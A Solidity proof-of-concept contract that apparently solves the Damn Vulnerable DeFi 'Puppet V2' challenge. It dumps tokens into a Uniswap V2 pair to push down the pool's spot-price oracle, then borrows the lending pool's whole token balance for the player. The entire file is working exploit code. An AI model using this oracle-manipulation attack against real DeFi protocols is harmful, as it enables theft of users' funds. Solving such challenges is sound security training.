// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetV2Pool.sol";
import "../DamnValuableToken.sol";

interface IUniswapV2Router01 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory);
}

contract Puppetv2_POC {
    PuppetV2Pool public pool;
    IUniswapV2Router01 public router;
    DamnValuableToken public token;
    IERC20 public weth;
    
    address public player;
    address[] public path;
    

    constructor(
        PuppetV2Pool _pool, 
        IUniswapV2Router01 _router, 
        DamnValuableToken _token,
        IERC20 _weth ) {
        player = msg.sender;
        pool = _pool;
        router = _router;
        token = _token;
        weth = _weth;
    }

    function exploit() external {
        require(player == msg.sender);

        path.push(address(token));      
        path.push(address(weth));

        uint256 balance = token.balanceOf(address(this));

        token.approve(address(router), balance);
        
        router.swapExactTokensForTokens(balance, 0, path, address(this), block.timestamp);
        
        uint256 calc_value = pool.calculateDepositOfWETHRequired(token.balanceOf(address(pool)));
        weth.approve(address(pool), calc_value);

        pool.borrow(token.balanceOf(address(pool)));

        token.transfer(player, token.balanceOf(address(this)));
    }
}